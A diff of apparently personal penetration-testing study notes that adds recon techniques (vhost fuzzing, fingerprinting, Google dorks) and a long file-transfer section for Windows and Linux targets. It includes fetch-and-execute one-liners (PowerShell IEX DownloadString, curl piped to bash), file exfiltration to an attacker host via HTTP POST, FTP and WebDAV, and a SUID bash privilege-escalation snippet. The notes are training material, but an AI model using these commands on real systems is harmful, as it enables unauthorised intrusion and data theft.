@@ -1378,7 +1378,13 @@ Check if it's vulnerable to **CVE-2004-2687** to execute arbitrary code:
 nmap -p 3632 <ip> --script distcc-cve2004-2687 --script-args="distcc-exec.cmd='id'"
 ```
 
+### 5000 - Docker Registry
 
+#### Generalities
+
+- Purpose:
+
+  Docker images are organized within **Docker repositories** in the registry, each repository storing various versions of a specific image. The functionality provided allows for images to be downloaded  locally or uploaded to the registry, assuming the user has the necessary permissions.
 
 ### 5985-6 - WINRM
 
@@ -1570,7 +1576,7 @@ Parameters are very important to spot, and they are grouped in different categor
      - `NS` records: show which name servers are used to resolve the FQDN to IP addresses. Most hosting  providers use their own name servers, making it easier to identify the hosting provider.
      - `TXT` records: often contains verification keys for different third-party providers and other security aspects of DNS, such as [SPF](https://datatracker.ietf.org/doc/html/rfc7208), [DMARC](https://datatracker.ietf.org/doc/html/rfc7489), and [DKIM](https://datatracker.ietf.org/doc/html/rfc6376), which are responsible for verifying and confirming the origin of the  emails sent.
 
-   - **Certificate Transparency (CT) logs:**  SSL certificate providers share the CT with the website https://crt.sh/, which stores everything in a database.
+   - **Certificate Transparency (CT) logs:**  SSL certificate providers share the CT with the website https://crt.sh/, which stores everything in a database. FOr a deeper search: [Censys](https://search.censys.io/)
 
      Certificate Transparency (CT) is an Internet security standard for monitoring and auditing the issuance of digital certificates. When an Internet user interacts with a website, a trusted third party  is needed for assurance that the website is legitimate and that the  website's encryption key is valid.
 
@@ -1600,6 +1606,10 @@ Parameters are very important to spot, and they are grouped in different categor
      whois [DOMAIN]
      ```
 
+   - [Wayback Machine](https://web.archive.org/)
+
+     It allows users to "go back in time" and view snapshots of websites as they appeared at various points in their history.
+
 2. Fuzzing:
 
    ```bash
@@ -1608,18 +1618,58 @@ Parameters are very important to spot, and they are grouped in different categor
 
 3. Add DNS Server to the `/etc/resolv.conf` file.
 
-
-
 ### VHosts
 
-The key difference between `VHosts` and `subdomains` is their relationship to the `Domain Name System (DNS)` and the web server's configuration.
+#### Generalities
 
-- `Subdomains`: These are extensions of a main domain name (e.g., `blog.example.com` is a subdomain of `example.com`). `Subdomains` typically have their own `DNS records`, pointing to either the same IP address as the main domain or a  different one. They can be used to organise different sections or  services of a website.
-- `Virtual Hosts` (`VHosts`): Virtual hosts are  configurations within a web server that allow multiple websites or  applications to be hosted on a single server. They can be associated  with top-level domains (e.g., `example.com`) or subdomains (e.g., `dev.example.com`). Each virtual host can have its own separate configuration, enabling precise control over how requests are handled.
+- Purpose:
+
+  A virtual host is a alternate, parallell hostname for your box that  allows your box to react differently depending on what alternate name  visitors aims at.  
+
+- Vhosts vs Subdomains:
+
+  - `Subdomains`: These are extensions of a main domain name (e.g., `blog.example.com` is a subdomain of `example.com`). `Subdomains` typically have their own `DNS records`, pointing to either the same IP address as the main domain or a  different one. They can be used to organise different sections or  services of a website.
+
+  - `Virtual Hosts` (`VHosts`): Virtual hosts are  configurations within a web server that allow multiple websites or  applications to be hosted on a single server. They can be associated  with top-level domains (e.g., `example.com`) or subdomains (e.g., `dev.example.com`). Each virtual host can have its own separate configuration, enabling precise control over how requests are handled.
+
+- Types:
+  - Name-based: relies solely on the `HTTP Host header` to distinguish between websites.
+  - IP-based
+  - Port-based
 
 #### Vhosts Fuzzing
 
+AFTER FINDING A VHOST REPEAT THE FUZZING-> ADD 
 
+```bash
+ffuf -mc all -ac -acs advanced -u [URL] -c -w [WORDLIST] -H "Host: FUZZ.[DOMAIN]]"
+```
+
+### Crawling
+
+1. `Burp Suite Spider`:  
+
+2. `OWASP ZAP (Zed Attack Proxy)`: 
+
+3. `ReconSpider (Python Framework)`:
+
+   ```bash
+   python3 ReconSpider.py [URL]
+   ```
+
+4. `Apache Nutch (Scalable Crawler)`:
+
+### Automatic Recon
+
+- [FinalRecon](https://github.com/thewhiteh4t/FinalRecon): 
+
+- [Recon-ng](https://github.com/lanmaster53/recon-ng): 
+
+- [theHarvester](https://github.com/laramies/theHarvester): 
+
+- [SpiderFoot](https://github.com/smicallef/spiderfoot): 
+
+- [OSINT Framework](https://osintframework.com/): 
 
 ### Directories and files
 
@@ -1643,40 +1693,74 @@ gobuster dir -u {IP} -w {/usr/share/seclists/Discovery/Web-Content/WORDLIST}
   - `vim -r [swap file]` to read it
   - `strings [swap file]`  to only display the human-readable text if the file is unrecoverable
 
-- **robots.txt** 
+- `robots.txt`
 
-  It is common for websites to contain a `robots.txt` file,  whose purpose is to instruct search engine web crawlers such as  Googlebot which resources can and cannot be accessed for indexing. The `robots.txt` file can provide valuable information such as the location of private files and admin pages. 
+  It is common for websites to contain a `robots.txt` file,  whose purpose is to instruct search engine web crawlers bots which resources can and cannot be accessed for indexing. The `robots.txt` file can provide valuable information such as the location of private files and admin pages. 
+  
+  `User-agent`: This line specifies which crawler or bot the following rules apply to. A wildcard (`*`) indicates that the rules apply to all bots. 
+  
+  `Directives`: specific instructions to the user-agent. Common directives:
+  
+  - `Disallow`
+  
+    paths that the bot can't crawl.
+  
+  - `Allow`
+  
+    Permits the bot to crawl specific paths, even if in`Disallow`.
+  
+  - `Crawl-delay`
+  
+    Sets a delay (in sec) between successive requests to avoid overloading
+  
+  - `Sitemap`
+  
+    Provides the URL to an XML sitemap for more efficient crawling.
+  
+- `.well-known`
 
-### Other Informations
+  It is a standardized directory, typically accessible in `/.well-known/` from the web server , that centralizes a website's critical metadata, including configuration files and information related to its services,  protocols, and security mechanisms. Some common URIs:
 
-- **Banner Grabbing**:
+  - `security.txt`
 
-  - ```bash
-    curl -IL {URL}
-    ```
+    Contains contact information for security researchers to report vulnerabilities.
 
-- **Eyewitness:** can be used to take screenshots of target web applications, fingerprint them, and identify possible default credentials.
+  - `change-password`
 
-  - ```bash
-    echo "{URLS}" > urls.txt 
-    ```
+    Provides a standard URL for directing users to a password change page.
 
-  - ```bash
-    eyewitness -f urls.txt -d screens
-    ```
+  - `openid-configuration`
 
-- **Whatweb:** We can extract the version of web servers, supporting frameworks, and applications
+    Defines configuration details for OpenID Connect, an identity layer on top of the OAuth 2.0 protocol. Interesting for *endpoint discovery*.
 
-  - ```bash
-    whatweb {IP}
-    ```
+  - `assetlinks.json`
 
-- **SSL/TLS Certificates:**bviewing the certificate could reveal details, such as the email  address and company name. These could potentially be used to conduct a  *phishing attack*.
+    Used for verifying ownership of digital assets (e.g. apps) associated with a domain.
 
-- **source code** `CRTL + U`
+  - `mta-sts.txt`
+
+    Specifies the policy for SMTP MTA Strict Transport Security (MTA-STS) to enhance email security.
+
+### Fingerprinting
+
+**Banner Grabbing**:
+
+```bash
+curl -IL {URL}
+```
 
 
-### Cloud
+
+| Tool         | Description                                                  | Features                                                     |
+| ------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
+| `Wappalyzer` | Browser extension and online service for website technology profiling. | Identifies a wide range of web technologies, including CMSs, frameworks, analytics tools, and more. |
+| `BuiltWith`  | Web technology profiler that provides detailed reports on a website's technology stack. | Offers both free and paid plans with varying levels of detail. |
+| `WhatWeb`    | Command-line tool for website fingerprinting.                | Uses a vast database of signatures to identify various web technologies. |
+| `Nmap`       | Versatile network scanner that can be used for various reconnaissance tasks, including service and OS fingerprinting. | Can be used with scripts (NSE) to perform more specialised fingerprinting. |
+| `Netcraft`   | Offers a range of web security services, including website fingerprinting and security reporting. | Provides detailed reports on a website's technology, hosting provider, and security posture. |
+| `wafw00f`    | Command-line tool specifically designed for identifying Web Application Firewalls (WAFs). | Helps determine if a WAF is present and, if so, its type and configuration. |
+
+## Cloud
 
 `Amazon` (`AWS`), `Google` (`GCP`), and `Microsoft` (`Azure`) 
 
@@ -1951,7 +2035,26 @@ Contra:
   echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/exp\nchmod 4777 /tmp/exp' > file_to_execute
   ```
 
-  
+
+
+
+## Verify code execution
+
+1. In the code execute the command:
+
+   ```bash
+   ping [YOUR_IP]
+   ```
+
+   - `-c 2` (Linux) to only send two ping packages
+
+   - `-n 2` (Windows) to only send two ping packages
+
+2. Open a ping listener:
+
+   ```bash
+   sudo tcpdump -i tun0 icmp
+   ```
 
 # Privilege Escalation
 
@@ -2090,47 +2193,294 @@ ssh-copy-id -i key.pub root@10.10.10.10	#copy key.pub in and add it to the remot
 ssh root@10.10.10.10 -i key	# Login
 ```
 
+# Transferring files
 
+## Windows
 
-# General Knowledge
+### Download
 
-## Transferring files
+#### Base64
 
-**wget/cURL to upload**
+Note that Windows Command Line utility (cmd.exe) has a maximum string length of  8,191 characters. Also, a web shell may error if you attempt to send  extremely large strings. 
 
-- On my machine, go on the directory containing the file in interest
+1. check the encoding to compare later:
 
-- Run a server in it
+   ```bash
+   md5sum [FILE]
+   ```
 
-  ```bash
-  python3 -m http.server 8000	
+2. encode a file to a base64 string
+
+   ```bash
+   cat [FILE] |base64 -w0;echo
+   ```
+
+3. copy the string, paste it in the Windows terminal and decode:
+
+   ```cmd
+   [IO.File]::WriteAllBytes("[LOCATION]", [Convert]::FromBase64String("[STRING]"))		
+   ```
+
+4. Check if everything went correctly:
+
+   ```cmd
+   Get-FileHash [LOCATION] -Algorithm md5
+   ```
+
+#### Powershell web Downloads
+
+Defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types (like .exe), or only allow access to a list of whitelisted domains.
+
+***Errors:***
+
+- There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter `-UseBasicParsing`.
+
+- If the certificate is not trusted:
+
+  ```powershell
+  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
   ```
 
-  If the machine is very old it could be that the python server won't work. In this case for Windows one can use smb and host the current folder (if not specifies instead of `.`):
+***WebClient methods for downloading data from a resource:***
 
-  ```bash
-  smbsrver.py -ip [YOUR IP] share .
+- [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0): Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0).
+
+- [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0): Returns the data from a resource without blocking the calling thread.
+
+- [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0): Downloads data from a resource and returns a Byte array.
+
+  - File Download:
+
+    ```cmd
+    (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
+    ```
+
+    The `WebClient` class provides methods for sending HTTP requests and handling responses, like downloading or uploading data.
+
+  - Fileless (directly execute)
+
+    ```cmd
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com')
+    ```
+
+    You can add ` | IEX` to send pipeline input.
+
+- [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0): Downloads data from a resource and returns a Byte array without blocking the calling thread.
+
+- [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0): Downloads data from a resource to a local file.
+
+- [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0): Downloads data from a resource to a local file without blocking the calling thread.
+
+- [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0): Downloads a String from a resource and returns a String.
+
+- [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0): Downloads a String from a resource without blocking the calling thread.
+
+-  [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name.
+
+  ```cmd
+  Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
   ```
 
-  Remotely you connect by:
+#### SMB Downloads
 
-  ```
-  copy \\[YOUR IP]\share\[FILE] [OUTPUT_FILE]
-  ```
+1. Create SMB server
 
-- Download remotely
+   ```bash
+   smb_server()
+   ```
 
-  ```bash
-  curl [URL] -o [FILE_NAME]
-  ```
+   New versions of Windows block unauthenticated guest access, in this case you need to set unsername and password in SMB
 
-**SCP**
+   ```bash
+   smbserver.py -ip $tunip -username USER -password PASS share . 
+   ```
 
-If we have ssh credentials:
+2. Copy a file from the SMB server
+
+   ```cmd
+   copy \\[YOUR IP]\share\[FILE]
+   ```
+
+   If you need credentials:
+
+   ```cmd
+   net use n: \\[YOUR IP]\share /user:USER PASS
+   copy n:\[FILE]
+   ```
+
+#### FTP Downloads
+
+1. Setting up the server
+
+   ```bash
+   sudo python3 -m pyftpdlib --port 21
+   ```
+
+    Anonymous authentication is enabled by default
+
+2. Use Powershell `Net.WebClient` or FTP on Windows to download the file
+
+3. If the shell is not interactive, you can create an FTP command file to download the file:                 
+
+   ```cmd-session
+   C:\htb> echo open 192.168.49.128 > ftpcommand.txt
+   C:\htb> echo USER anonymous >> ftpcommand.txt
+   C:\htb> echo binary >> ftpcommand.txt
+   C:\htb> echo GET file.txt >> ftpcommand.txt
+   C:\htb> echo bye >> ftpcommand.txt
+   C:\htb> ftp -v -n -s:ftpcommand.txt
+   ftp> open 192.168.49.128
+   Log in with USER and PASS first.
+   ftp> USER anonymous
+   
+   ftp> GET file.txt
+   ftp> bye
+   
+   C:\htb>more file.txt
+   This is a test file
+   ```
+
+### Upload
+
+#### Base 64
+
+1. Encode with Powershell
+
+   ```powershell
+   [Convert]::ToBase64String((Get-Content -path "[PATH]" -Encoding byte))
+   ```
+
+2. Check MD5 hash to check later if the procedure was successsfull
+
+   ```powershell
+   Get-FileHash "[PATH]" -Algorithm MD5 | select Hash	
+   ```
+
+3. Copy paste point 1. and decode in your machine
+
+   ```bash
+   echo [STRING] | base64 -d > hosts
+   ```
+
+4. Check if the procedure was correct by comparing with 2.:
+
+   ```bash
+   md5sum hosts
+   ```
+
+#### Powershell - python server
+
+1. Open a server
+
+   ```bash
+   python3 -m uploadserver
+   ```
+
+2. Upload via Invoke-RestMethod
+
+   ```cmd
+   > IEX(New-Object Net.WebClient).DownloadString('[LINK]')
+   > Invoke-FileUpload -Uri http://[IP]/upload -File [FILE PATH]
+   ```
+
+#### Powershell - netcat + base64
+
+1. Open netcat listener
+
+   ```bash
+   listen 8000	
+   ```
+
+2. Send the file by using `Invoke-WebRequest` or `Invoke-RestMethod` in base 64
+
+   ```powershell
+   > $b64 = [System.convert]::ToBase64String((Get-Content -Path '[PATH]' -Encoding Byte))
+   > Invoke-WebRequest -Uri http://[IP]/ -Method POST -Body $b64
+   ```
+
+3. Decode
+
+   ```bash
+   echo <base64> | base64 -d -w 0 > hosts
+   ```
+
+#### SMB - WebDav
+
+Commonly enterprises don't allow the SMB protocol (TCP/445) out of  their internal network because this can open them up to potential  attacks. An alternative is to run SMB over HTTP with `WebDav`.
+
+1. Open WebDav
+
+   ```bash
+   sudo wsgidav --host=0.0.0.0 --port=[PORT] --root=/tmp --auth=anonymous 
+   ```
+
+2. Connect to WebDav
+
+   ```powershell
+   > dir \\[IP]\DavWWWRoot
+   ```
+
+3. Upload with SMB
+
+   ```powershell
+   > copy [FILE] \\[IP]\DavWWWRoot\
+   ```
+
+#### FTP
+
+1. Open FTP server with write 
+
+   ```bash
+   sudo python3 -m pyftpdlib --port 21 --write
+   ```
+
+2. Powershell to upload
+
+   ```powershell
+   (New-Object Net.WebClient).UploadFile('ftp://[IP]/ftp-hosts', 'FILE')
+   ```
+
+3. If the shell is not interactive, upload with a FTP Command File:
+
+   ```cmd-session
+   C:\htb> echo open 192.168.49.128 > ftpcommand.txt
+   C:\htb> echo USER anonymous >> ftpcommand.txt
+   C:\htb> echo binary >> ftpcommand.txt
+   C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
+   C:\htb> echo bye >> ftpcommand.txt
+   C:\htb> ftp -v -n -s:ftpcommand.txt
+   ftp> open 192.168.49.128
+   
+   ftp> USER anonymous
+   ftp> PUT c:\windows\system32\drivers\etc\hosts
+   ftp> bye
+   ```
+
+## Linux
+
+### Download
+
+#### wget/cURL (file) 
 
 ```bash
-scp [FILE_NAME] user@remotehost:[FILE_PATH]
+wget [LINK] -O [OUTPUT PATH]
 ```
+
+```bash
+curl [LINK] -o [OUTPUT PATH]
+```
+
+#### wget/cURL (fileless)
+
+```bash
+wget [LINK] -O | [COMMAND]
+```
+
+```bash
+curl [LINK] -qO- | [COMMAND]
+```
+
+The `COMMAND` is e.g. `bash` or `python3`, that is, what executes the file in the link. Can also be used with a parser, such as `jq '.'`.
 
 **Base64**
 
@@ -2138,19 +2488,19 @@ In some cases, we may not be able to transfer the file. For example, the remote 
 
 We can encode the file into `base64` format, and then we can paste the `base64` string on the remote server and decode it.
 
-- Encode the file
+1. Encode the file
 
+```bash
+cat [FILE] |base64 -w 0;echo
 ```
-base64 [FILE_NAME] -w 0
+
+2. Copy the string
+
+3. Go on the remote host, decode
+
+```bash
+echo -n [STRING] | base64 -d > [FILE_NAME]
 ```
-
-- Copy the string
-
-- Go on the remote host, decode
-
-  ```bash
-  echo [STRING] | base64 -d > [FILE_NAME]
-  ```
 
 **Validate Transfer**
 
@@ -2158,9 +2508,129 @@ base64 [FILE_NAME] -w 0
 
 `md5sum` validates the hash of the filestomi
 
-## Windows
+#### Bash /dev/tcp
+
+As long as Bash version 2.04 or greater is installed (compiled with  --enable-net-redirections), the built-in /dev/TCP device file can be  used for simple file downloads.
+
+1. Connect to the target Webserver
+
+   ```bash
+   exec 3<>/dev/tcp/[IP]/[PORT]
+   ```
+
+2. HTTP GET Request
+
+   ```bash
+   echo -e "GET [FILE] HTTP/1.1\n\n">&3
+   ```
+
+3. Print the response
+
+   ```bash
+   cat <&3
+   ```
+
+#### SSH
+
+`SCP` is very similar to `copy` or `cp`, but instead of providing a local path, we need to specify a username,  the remote IP address or DNS name, and the user's credentials.
+
+1. Enable SSH server
+
+   ```bash
+   sudo systemctl enable ssh
+   ```
+
+2. Start the server
+
+   ```
+   sudo systemctl start ssh
+   ```
+
+3. Check for listening port
+
+   ```bash
+   netstat -lnpt
+   ```
+
+4. Download
+
+   ```bash
+   scp user@remotehost:[FILE_PATH]
+   ```
+
+### Upload
+
+#### Web Upload
+
+1. Create self-signed certificate
+
+   ```bash
+   openssl req -x509 -out /tmp/server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+   ```
+
+2. Start Web Server in a new folder
+
+   ```bash
+   mkdir /tmp/https && cd /tmp/https
+   sudo python3 -m uploadserver 443 --server-certificate /tmp/server.pem
+   ```
+
+3. Upload (multiple files can be specified)
+
+   ```bash
+   curl -X POST https://[IP]/upload -F 'files=@[FILE]' --insecure
+   ```
+
+   `--insecure` since we used a self-signed certificate that we trust.
+
+#### Server upload
+
+1. Run a server on my machine
+
+   ```bash
+   # Different methods depending on what is available on the target
+   python3 -m http.server 8000	
+   python2.7 -m SimpleHTTPServer
+   php -S 0.0.0.0:8000
+   ruby -run -ehttpd . -p8000
+   ```
+
+- Download from the target
+
+  ```bash
+  curl [URL] -o [FILE_NAME]
+  ```
+
+#### SCP
+
+```bash
+scp [FILE] user@targethost:[OUTPUT LOCATION]
+```
+
+# General Knowledge
 
 ## Google search
 
-- `intext:*term*` restricts results to documents containing *`term`* in the text. 
--  `inurl:` in your query, Google will restrict the results to documents containing that word in the URL.
+| Operator                | Operator Description                                         | Example                                             | Example Description                                          |
+| ----------------------- | ------------------------------------------------------------ | --------------------------------------------------- | ------------------------------------------------------------ |
+| `site:`                 | Limits results to a specific website or domain.              | `site:example.com`                                  | Find all publicly accessible pages on example.com.           |
+| `inurl:`                | Finds pages with a specific term in the URL.                 | `inurl:login`                                       | Search for login pages on any website.                       |
+| `filetype:`             | Searches for files of a particular type.                     | `filetype:pdf`                                      | Find downloadable PDF documents.                             |
+| `intitle:`              | Finds pages with a specific term in the title.               | `intitle:"confidential report"`                     | Look for documents titled "confidential report" or similar variations. |
+| `intext:` or `inbody:`  | Searches for a term within the body text of pages.           | `intext:"password reset"`                           | Identify webpages containing the term “password reset”.      |
+| `cache:`                | Displays the cached version of a webpage (if available).     | `cache:example.com`                                 | View the cached version of example.com to see its previous content. |
+| `link:`                 | Finds pages that link to a specific webpage.                 | `link:example.com`                                  | Identify websites linking to example.com.                    |
+| `related:`              | Finds websites related to a specific webpage.                | `related:example.com`                               | Discover websites similar to example.com.                    |
+| `info:`                 | Provides a summary of information about a webpage.           | `info:example.com`                                  | Get basic details about example.com, such as its title and description. |
+| `define:`               | Provides definitions of a word or phrase.                    | `define:phishing`                                   | Get a definition of "phishing" from various sources.         |
+| `numrange:`             | Searches for numbers within a specific range.                | `site:example.com numrange:1000-2000`               | Find pages on example.com containing numbers between 1000 and 2000. |
+| `allintext:`            | Finds pages containing all specified words in the body text. | `allintext:admin password reset`                    | Search for pages containing both "admin" and "password reset" in the body text. |
+| `allinurl:`             | Finds pages containing all specified words in the URL.       | `allinurl:admin panel`                              | Look for pages with "admin" and "panel" in the URL.          |
+| `allintitle:`           | Finds pages containing all specified words in the title.     | `allintitle:confidential report 2023`               | Search for pages with "confidential," "report," and "2023" in the title. |
+| `AND`                   | Narrows results by requiring all terms to be present.        | `site:example.com AND (inurl:admin OR inurl:login)` | Find admin or login pages specifically on example.com.       |
+| `OR`                    | Broadens results by including pages with any of the terms.   | `"linux" OR "ubuntu" OR "debian"`                   | Search for webpages mentioning Linux, Ubuntu, or Debian.     |
+| `NOT`                   | Excludes results containing the specified term.              | `site:bank.com NOT inurl:login`                     | Find pages on bank.com excluding login pages.                |
+| `*` (wildcard)          | Represents any character or word.                            | `site:socialnetwork.com filetype:pdf user* manual`  | Search for user manuals (user guide, user handbook) in PDF format on socialnetwork.com. |
+| `..` (range search)     | Finds results within a specified numerical range.            | `site:ecommerce.com "price" 100..500`               | Look for products priced between 100 and 500 on an e-commerce website. |
+| `" "` (quotation marks) | Searches for exact phrases.                                  | `"information security policy"`                     | Find documents mentioning the exact phrase "information security policy". |
+| `-` (minus sign)        | Excludes terms from the search results.                      | `site:news.com -inurl:sports`                       | Search for news articles on news.com excluding sports-related content. |
